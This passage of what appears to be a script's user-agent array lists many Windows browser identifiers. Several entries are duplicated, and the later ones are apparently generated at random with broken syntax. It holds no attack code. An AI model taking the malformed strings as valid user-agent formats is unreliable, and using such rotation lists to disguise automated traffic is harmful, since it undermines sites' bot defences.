AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246','Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.1058','Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; RM-1127_16056) AppleWebKit/537.36(KHTML, like Gecko) Chrome/42.0.2311.135 Mobile Safari/537.36 Edge/12.10536','Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.15254','Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Vivaldi/5.7.2921.63','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Vivaldi/5.7.2921.63','Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:111.0) Gecko/20100101 Firefox/111.0','Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.44','Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.44','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Vivaldi/5.7.2921.63','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Vivaldi/5.7.2921.63','Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:111.0) Gecko/20100101 Firefox/111.0','Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.44','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 YaBrowser/23.1.2 Yowser/2.5 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 YaBrowser/23.1.2 Yowser/2.5 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Vivaldi/5.7.2921.63','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Vivaldi/5.7.2921.63','Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 OPR/96.0.4693.80','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 OPR/96.0.4693.80','Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edge/44.18363.8131','Mozilla/5.0 (Windows Mobile 10; Android 10.0; Microsoft; Lumia 950XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36 Edge/40.15254.603','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.44','Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko','Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:111.0) Gecko/20100101 Firefox/111.0','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36537.36','Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64; XBOX_ONE_ED) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393','Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox Series X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.82 Safari/537.36 Edge/20.02','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246','Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.1058','Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; RM-1127_16056) AppleWebKit/537.36(KHTML, like Gecko) Chrome/42.0.2311.135 Mobile Safari/537.36 Edge/12.10536','Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.15254','Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.02','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59','Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Vivaldi/5.7.2921.63','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Vivaldi/5.7.2921.63','Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:111.0) Gecko/20100101 Firefox/111.0','Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.44','Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)L523T) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4782.94 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)M349Q) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4755.90 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)S840H) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4283.118 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)J425L) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4552.51 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)B975X) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4251.106 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)P472Z) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4861.103 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)Q844J) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4682.47 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)Q722F) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4880.127 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)B779Z) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4882.138 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)K782V) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4655.63 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)L965Z) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4386.58 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)O868O) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4210.130 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)D432P) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4221.91 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)C63T) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4801.118 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)S815O) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4727.98 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)A669J) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4868.44 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Y536Z) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4893.79 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)Y610J) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4625.80 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Y907L) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4684.67 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)J775N) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4760.141 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)R132G) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4247.135 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)Y278P) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4789.125 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)N344N) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4220.87 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)A741P) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4688.51 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Z235C) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4616.121 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)K314J) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4387.115 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)D553Y) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4594.43 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)N569N) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4885.136 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)S335R) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4319.52 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)S102C) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4624.99 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)E473M) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4362.101 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)L431O) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4416.92 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)W337Q) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4598.81 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)S680Y) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4370.135 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Q341X) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4444.122 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)Q123K) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4339.149 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)F702H) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4886.139 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)C346X) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4362.140 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)W907P) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4272.82 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)S675P) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4875.109 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)S242A) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4746.43 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)D125S) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4511.40 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)O690L) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4827.89 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)T191S) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4757.86 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)H70Q) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4544.56 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)J758G) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4422.103 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)M860R) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4594.40 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)Q194M) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4889.125 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)Y170X) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4817.48 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)A706W) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4405.41 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)I883A) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4399.140 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)D264R) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4466.91 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)S583I) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4853.53 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)C449R) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4637.114 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)J908A) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4667.42 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)U921A) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4760.149 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)L525A) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4418.132 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)K497Y) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4518.51 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)I301P) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4427.134 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)A352M) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4423.53 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)A684P) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4710.67 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)L679E) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4509.98 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)F745Y) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4511.149 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)C46A) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4215.144 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)F376J) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4763.103 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)M790H) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4533.68 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)F824J) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4553.91 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)J126J) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4348.73 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)Q27V) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4315.69 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)J770M) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4326.62 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)T317O) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4471.95 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)W251T) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4363.87 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)Z842Q) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4667.139 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)E687O) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4677.106 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)Y105Q) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4862.57 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)J638X) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4830.75 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)B824Q) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4439.138 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Z700L) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4549.126 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)N835S) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4860.40 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)K984C) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4670.43 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)P859W) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4726.90 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)E558C) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4834.113 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)O688U) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4511.51 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)N152B) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4723.56 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)I616F) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4846.42 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)C895F) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4831.98 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)J621R) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4830.81 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)C579H) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4388.79 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)R678N) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4283.128 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)A151H) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4569.105 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)G548U) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4690.108 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)K471F) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4211.150 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)C754S) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4225.128 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)C611Z) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4897.85 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)Q71F) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4328.137 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)R23X) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4457.149 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)A73A) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4886.71 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)L585T) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4885.140 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)V27D) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4250.73 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)K796V) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4283.103 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)L533C) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4641.80 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)D467A) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4771.148 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)J178P) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4605.93 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)W937L) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4761.74 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)O334E) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4701.64 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)P437P) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4362.40 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)C565Q) AppleWebKit/537.36 (KHTML, like 